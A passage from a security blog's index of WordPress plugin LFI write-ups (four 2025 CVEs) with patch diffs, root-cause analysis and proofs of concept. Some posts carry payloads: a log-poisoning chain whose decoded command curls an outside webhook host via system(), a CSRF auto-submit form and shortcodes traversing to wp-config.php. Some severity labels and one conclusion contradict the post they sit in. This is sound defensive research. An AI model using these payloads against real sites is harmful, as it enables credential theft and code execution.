will execute any PHP code (\u003c?php ?\u003e) contained in the file before returning. The payload is Base64-encoded and decoded at include time with base64_decode to avoid escaping issues with quotes (\" → \\\") when the logger writes it. The decoded command becomes: curl -I 'https://webhook.site/bac7e163-b475-4323-a315-acd010359640' Finally, system() runs this command and returns its output. Warning Note: although base64_decode may be blocked by the plugin, Apache logged the payload before the plugin processed it; the Base64 string was still recorded in the log. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Hide My WP Ghost version ≤ 5.4.01 allows LFI because the plugin reconstructs a path and then include()s it without canonicalization/whitelisting. By combining log‑poisoning and a payload containing /wp-activate.php/?, an attacker can escalate LFI to RCE in some configurations. The issue is fixed in 5.4.02 by sanitizing the URL before returning. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:3","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Do not directly include data from requests. Use realpath() / basename() / whitelist / base_dir checks before including. sanitize_text_field() is not sufficient to prevent traversal. Log poisoning (User‑Agent, Referer…) can create an inclusionable payload source — do not log raw content that might later be included. Fixes must combine: sanitize + canonicalize + directory restriction + control over log write permissions. ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:4:4","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — Hacktrick WordPress Hide My WP Ghost Plugin \u003c= 5.4.01 is vulnerable to Local File Inclusion ","date":"2025-10-18","objectID":"/posts/2025-10-18-cve-2025-26909/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-26909 Analysis \u0026 POC","uri":"/posts/2025-10-18-cve-2025-26909/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress License For Envato Plugin.","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The License For Envato plugin version ≤ 1.0.0 contains a Local File Inclusion vulnerability that allows an attacker to control the file parameter used in include/require without authentication, thereby including or reading local files on the server (e.g., configuration files containing credentials), leading to sensitive information disclosure and, in some configurations, potential code execution. CVE ID: CVE-2025-39399 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.0.0 Patched Versions: 1.1.0 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress License For Envato Plugin ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - License For Envato: 1.0.0 (vulnerable) and 1.1.0 (patched). Diff tool - Meld or any diff/compare tool to inspect differences between the two versions. ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable version: \u003cdiv class=\"wrap\"\u003e \u003c?php $action = isset( $_GET['tab'] ) ? sanitize_text_field( $_GET['tab'] ) : 'general'; ?\u003e // other logic \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { $template = \"{$licenseEnvato_nav_view}/{$action}.php\"; } if ( file_exists( $template ) ) { include $template; }else{ include \"{$licenseEnvato_nav_view}/general.php\"; } ?\u003e \u003c/div\u003e In the vulnerable version, the value of $action is taken directly from $_GET['tab']. Although this value is passed through sanitize_text_field(), that function only strips HTML tags — it does not prevent path traversal sequences like ../. Therefore, an attacker can supply a value such as ?tab=../../somefile, causing $action to contain an unexpected path. When this value is concatenated into $template and then included =\u003e LFI occurs. Patched version: \u003c?php // Exit if accessed directly defined('ABSPATH') || exit; // Define allowed tab values to prevent LFI $allowed_tabs = array('general', 'envato'); // Apply filter to allow extensions to add their own tabs $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); // Verify nonce if tab parameter is set $action = 'general'; if (isset($_GET['tab'])) { // Verify nonce for tab switching if provided if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(sanitize_text_field(wp_unslash($_GET['_wpnonce'])), 'license_envato_switch_tab')) { $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } elseif (!isset($_GET['_wpnonce'])) { // If no nonce is provided, still allow tab switching but sanitize input $tab = sanitize_text_field(wp_unslash($_GET['tab'])); // Only allow values from the whitelist $action = in_array($tab, $allowed_tabs) ? $tab : 'general'; } } ?\u003e \u003cdiv class=\"wrap\"\u003e \u003c?php $dir = __DIR__; $licenseEnvato_nav_view = apply_filters( 'license_envato_settings_view', $dir, $action ); if ($licenseEnvato_nav_view) { // Ensure we only include files within the plugin directory structure $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); // Verify the template is a child of the nav view directory to prevent path traversal if ($template \u0026\u0026 $nav_view_dir \u0026\u0026 strpos($template, $nav_view_dir) === 0 \u0026\u0026 file_exists($template)) { include $template; } else { // Fallback to general.php with the same security checks $general_template = realpath(\"{$licenseEnvato_nav_view}/general.php\"); if ($general_template \u0026\u0026 strpos($general_template, $nav_view_dir) === 0) { include $general_template; } } } ?\u003e \u003c/div\u003e The patch implements multiple measures to mitigate LFI and harden the handling of the tab parameter: Use a whitelist $allowed_tabs $allowed_tabs = array('general', 'envato'); $allowed_tabs = apply_filters('license_envato_allowed_tabs', $allowed_tabs); Verify nonce to prevent CSRF if (isset($_GET['_wpnonce']) \u0026\u0026 wp_verify_nonce(..., 'license_envato_switch_tab')) The reason the CVE is labeled Unauthenticated is that an attacker does not need an account on the target site to exploit it. A common technique is to trick an admin (or a privileged user) into visiting a page containing the payload. When the admin opens that page, the browser sends a request to the WordPress site including the admin session cookie — so the request is considered authenticated as the admin. If the plugin accepts and executes the parameter without nonce or permission checks, the LFI payload will be processed and exploited. Normalize and validate paths using realpath() $template = realpath(\"{$licenseEnvato_nav_view}/{$action}.php\"); $nav_view_dir = realpath($licenseEnvato_nav_view); ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code public function plugin_page() { $license_envato_api = new EnvatoLicenseApiCall(); $settingsView = __DIR__ . '/views/settingsView.php'; if ( file_exists( $settingsView ) ) { include $settingsView; } } settingsView.php is always present in the source, so it is definitely included in plugin_page(). public function admin_menu() { $parent_slug = 'licenseenvato'; $capability = 'manage_options'; add_submenu_page( $parent_slug, __( 'Settings', 'licenseenvato' ), __( 'Settings', 'licenseenvato' ), $capability, $parent_slug.'-settings', [ $this, 'settings' ] ); } public function settings() { $settings = new Settings(); $settings-\u003eplugin_page(); } plugin_page() is called via the “Settings” submenu callback, registered in admin_menu(). This submenu requires the manage_options capability, so it is shown only to admins. When an admin opens the “Settings” submenu (endpoint licenseenvato-settings), WordPress calls settings(), which instantiates the Settings class and runs plugin_page(). ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a page that contains the LFI payload \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003ew41bu1\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cform action=\"http://localhost/wp-admin/admin.php\" method=\"get\"\u003e \u003cinput type=\"text\" name=\"page\" value=\"licenseenvato-settings\"\u003e \u003cinput type=\"text\" name=\"tab\" value=\"../../../../../../wp-config\"\u003e \u003c/form\u003e \u003cscript\u003e document.forms[0].submit() \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Step 2 Send the link to the admin Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a page that contains the LFI payload \u003c!DOCTYPE html\u003e w41bu1 Step 2 Send the link to the admin Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a page that contains the LFI payload \u003c!DOCTYPE html\u003e w41bu1 Step 2 Send the link to the admin Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Version ≤ 1.0.0 of License For Envato allows LFI because include() uses $atts['template'] without proper validation; the vulnerability was fixed in 1.1.0 using basename() + realpath() and base_dir checks. ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Using only sanitize_text_field() is not sufficient to prevent path traversal in PHP. Any parameter used in include() or file operations must be controlled by a whitelist or validated via realpath(). CSRF combined with LFI can turn an admin-only flaw into an unauthenticated vulnerability if nonce verification is missing. Inputs must be strictly validated and the scope of accessible files restricted, especially in plugins that handle templates or views. Always validate and constrain paths when including files — never trust request data even if it has been “sanitized”. ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — Hacktrick WordPress License For Envato Plugin \u003c= 1.0.0 is vulnerable to Local File Inclusion ","date":"2025-10-17","objectID":"/posts/2025-10-17-cve-2025-39399/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-39399 Analysis \u0026 POC","uri":"/posts/2025-10-17-cve-2025-39399/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Subscribe to Download Lite Plugin.","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Subscribe to Download Lite plugin version ≤ 1.2.9 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, thereby including or reading local files on the server (for example configuration files that contain credentials), leading to sensitive information disclosure and, in some configurations, possible code execution. CVE ID: CVE-2025-30782 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 1.2.9 Patched Versions: 1.3.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Subscribe to Download Lite Plugin ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Subscribe to Download Lite: 1.2.9 (vulnerable) and 1.3.0 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between the two versions. ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable version: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); if (file_exists(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php')) { include(STDL_PATH . 'inc/views/frontend/form-templates/' . $form_template . '.php'); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e In the vulnerable version, $form_template is concatenated into the path and included without validating the input =\u003e LFI risk, for example: $form_template = '../../../../../../../wp-config' Patched version: \u003cdiv class=\"stdl-form-wrap stdl-\u003c?php echo esc_attr($form_template); ?\u003e stdl-alias\u003e\"\u003e \u003cform method=\"post\" action=\"\" class=\"stdl-subscription-form\" data-form-alias=\"stdl\"\u003e \u003c?php do_action('stdl_before_form', $form_details); $base_dir = realpath(STDL_PATH . 'inc/views/frontend/form-templates') . DIRECTORY_SEPARATOR; $sanitized_template = basename($form_template) . '.php'; $file_path = realpath($base_dir . $sanitized_template); if ($file_path \u0026\u0026 strpos($file_path, $base_dir) === 0 \u0026\u0026 file_exists($file_path)) { include($file_path); } do_action('stdl_after_form', $form_details); ?\u003e \u003c/form\u003e \u003c/div\u003e The patch uses basename() to extract the file name portion of $form_template, removing traversal sequences ../, for example: ../../../../../../payload.pdf -\u003e payload.pdf Then it concatenates into $base_dir and resolves the absolute path with realpath before include() =\u003e effectively eliminates the LFI possibility. ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code The vulnerable form-template.php shown above is invoked from stdl-shortcode.php \u003c?php $form_template = (!empty($atts['template'])) ? $atts['template'] : $form_details['layout']['template']; if (isset($_COOKIE['stdl_encryption_key']) \u0026\u0026 $this-\u003echeck_if_already_subscribed($_COOKIE['stdl_encryption_key']) \u0026\u0026 empty($form_details['general']['always_show'])) { // other logic } else { // other logic if ($display_type == 'direct') { include(STDL_PATH . 'inc/views/frontend/form-template.php'); } else { ?\u003e \u003cdiv class=\"stdl-popup-outerwrap \u003c?php echo esc_attr($popup_alias_class); ?\u003e\"\u003e \u003cinput type=\"button\" class=\"stdl-popup-trigger stdl-popup-\u003c?php echo esc_attr($form_template); ?\u003e\" value=\"\u003c?php echo esc_attr($popup_trigger_text); ?\u003e\"\u003e \u003cdiv class=\"stdl-popup-innerwrap\" style=\"display:none;\"\u003e \u003cdiv class=\"stdl-overlay stdl-popup-wrapper\"\u003e \u003cdiv class=\"stdl-popup-contetn-wrap\"\u003e \u003ca href=\"javascript:void(0)\" class=\"stdl-popup-close\"\u003e\u003ci class=\"fas fa-times\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c?php include(STDL_PATH . 'inc/views/frontend/form-template.php'); ?\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c?php } } $form_template is the value of $atts['template'] From CVE analysis experience on WordPress plugins, $atts is typically the shortcode attributes array, for example: [pornhub id=69] Note that form-template.php is always included within the inner if-else block inside the outer else when the stdl_encryption_key cookie does not exist (i.e., the user has not subscribed or does not have a valid encryption key). stdl-shortcode.php is included by the shortcode callback subscribe_to_download_form with atts being the shortcode attributes array. function __construct() { add_shortcode('subscribe_to_download_form', array($this, 'generate_shortcode_output')); } function generate_shortcode_output($atts) { wp_enqueue_style('stdl-frontend-custom', STDL_CSS_DIR . '/stdl-custom.css', array(), STDL_VERSION); ob_start(); include(STDL_PATH . 'inc/views/frontend/stdl-shortcode.php'); $form_html = ob_get_contents(); ob_clean(); return $form_html; } ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Log in to WordPress with a Contributor account (lowest privilege that can create posts). Step 2 Create a post with the shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: The debugger reached wp-config.php Successful LFI result ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Log in to WordPress with a Contributor account (lowest privilege that can create posts). Step 2 Create a post with the shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: The debugger reached wp-config.php Successful LFI result ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Log in to WordPress with a Contributor account (lowest privilege that can create posts). Step 2 Create a post with the shortcode [subscribe_to_download_form template='../../../../../../../wp-config'] Result: The debugger reached wp-config.php Successful LFI result ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#step-2"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion Version ≤ 1.2.9 of Subscribe to Download Lite allows LFI because include() uses an unvalidated $atts['template']; the issue was fixed in 1.3.0 by normalizing and restricting the template name (basename() + realpath() + base_dir check) before include(). Update immediately. ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:5:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key takeaways Shortcode input is untrusted — do not include directly. Patch (v1.3.0) uses basename() + realpath() + compare with allowed directory. Actions: update the plugin, whitelist/validate attributes. Monitor logs for ../ in template parameters. ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:6:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References File Inclusion/Path traversal — Hacktrick WordPress Subscribe to Download Lite Plugin \u003c= 1.2.9 is vulnerable to Local File Inclusion ","date":"2025-10-16","objectID":"/posts/2025-10-16-cve-2025-30782/:7:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30782 Analysis \u0026 POC","uri":"/posts/2025-10-16-cve-2025-30782/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Team Manager Plugin.","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Team Manager plugin version ≤ 2.1.23 contains a Local File Inclusion vulnerability that allows an unauthenticated attacker to control the file parameter used in include/require, enabling inclusion or reading of local files on the server (e.g., configuration files containing credentials), leading to leakage of sensitive information and, in some server configurations, possible code execution. CVE ID: CVE-2025-30868 Vulnerability Type: Local File Inclusion Affected Versions: \u003c= 2.1.23 Patched Versions: 2.2.0 CVSS severity: Low (7.5) Required Privilege: Contributor Product: WordPress Team Manager Plugin ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:1:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Team Manager: 2.1.23 (vulnerable) and 2.2.0 (patched). Diff tool - Meld or any diff tool to compare differences between versions. Elementor plugin ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:2:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:3:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch diff Vulnerable code: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); $path = stripslashes(TM_PATH . '/public/templates/elementor/layouts/' . $layout . '/'); $templateName = sanitize_file_name( $styleType . '.php' ); //allowed file type $allowedFileTypes = [ 'php' ]; $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION); if (in_array($ext, $allowedFileTypes)) { if (file_exists($path . $templateName)) { include self::locateTemplate($templateName, '', $path); } } } private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } In the vulnerable version, renderElementorLayout() does not validate input values. An attacker can bypass the logic if they control $layout and $settings, for example: In renderElementorLayout(): $layout = \"../../../../../../..\" $settings['../../../../../../.._style_type'] = \"wp-config\" Then: $styleType = 'wp-config' $path = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $templateName = wp-config.php $path . $templateName = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' Debugger values of variables After passing the if checks, the code includes the return value of locateTemplate(wp-config.php, '', TM_PATH . '/public/templates/elementor/layouts/../../../../../../../'): private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string { $templatePath = $templatePath ?: 'public/templates'; $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/'; $template = locate_template(trailingslashit($templatePath) . $templateName); return $template ?: \"{$defaultPath}{$templateName}\"; } At this point: $templatePath = public/templates $defaultPath = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../' $locate_template = locate_template('public/templates/wp-config.php') = \"\" — locate_template() returns the absolute path if found, otherwise returns an empty string \"\". When $locate_template is empty, it returns TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php' to include. Patched code: public static function renderElementorLayout(string $layout, array $data, array $settings): void { $allowedLayouts = ['grid', 'list', 'slider', 'table', 'isotope']; // Allowed layouts if (!in_array($layout, $allowedLayouts, true)) { wp_die(__('Invalid layout.', 'wp-team-manager')); } $styleTypeKey = \"{$layout}_style_type\"; $styleType = $settings[$styleTypeKey] ?? ''; // Ensure only safe characters (alphanumeric + underscores) if (!preg_match('/^[a-zA-Z0-9_-]+$/', $styleType)) { wp_die(__('Invalid style type.', 'wp-team-manager')); } // Ensure constants exist before using them if (!defined('TM_PATH')) { wp_die(__('TM_PATH is not defined.', 'wp-team-manager')); } // Define Free path (always available) $basePath = realpath(TM_PATH . '/public/templates/elementor/layouts/'); // Define Pro path if available $proPath = defined('TM_PRO_PATH') ? realpath(TM_PRO_PATH . '/public/templates/elementor/layouts/') : null; // Ensure the free path is valid if (!$basePath) { wp_die(__('Invalid base template path.', 'wp-team-manager')); } $templateName = sanitize_file_name($styleType . '.php'); // Define possible template paths (Pro first, then Free) $proFullPath = $proPath ? $proPath . '/' . $layout . '/' . $templateName : null; $freeFullPath = $basePath . '/' . $layout . '/' . $templateName; // Check if Pro template exists and is readable if ($proFullPath \u0026\u0026 is_readable($proFullPath) \u0026\u0026 strpos(realpath($proFullPath), $proPath) === 0) { in","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:3:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code Info The word Elementor in the function name renderElementorLayout() refers to the Elementor plugin in WordPress, used to build post content. When editing a post that contains this Team Manager widget or when opening a saved post, renderElementorLayout() will be invoked. Plugin element in Elementor Capture the edit request with BurpSuite: Key settings in the request We observe a settings key containing layout_type and {layout_type_value}_style_type keys corresponding to the analyzed code: $styleTypeKey = \"{$layout}_style_type\"; $styleType = stripslashes($settings[$styleTypeKey]); 👉 These values are controllable. ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:3:2","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2 Create a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3 Submit, capture the request with BurpSuite and send it to Repeater Step 4 Modify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2 Create a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3 Submit, capture the request with BurpSuite and send it to Repeater Step 4 Modify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result ","date":"2025-10-15","objectID":"/posts/2025-10-15-cve-2025-30868/:4:1","tags":["analyst","plugin","lfi"],"title":"CVE-2025-30868 Analysis \u0026 POC","uri":"/posts/2025-10-15-cve-2025-30868/#step-1"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Step 1 Create a new team at endpoint: wp-admin/post-new.php?post_type=team_manager because a new team provides values to add to the Team Manager widget layout. Step 2 Create a post using Elementor and add the Team Manager widget. Add the Team Manager widget to a post Step 3 Submit, capture the request with BurpSuite and send it to Repeater Step 4 Modify the action parameter’s value in the request using the Inspector and resend the payload Result: The debugger jumped to wp-config.php Successful LFI result 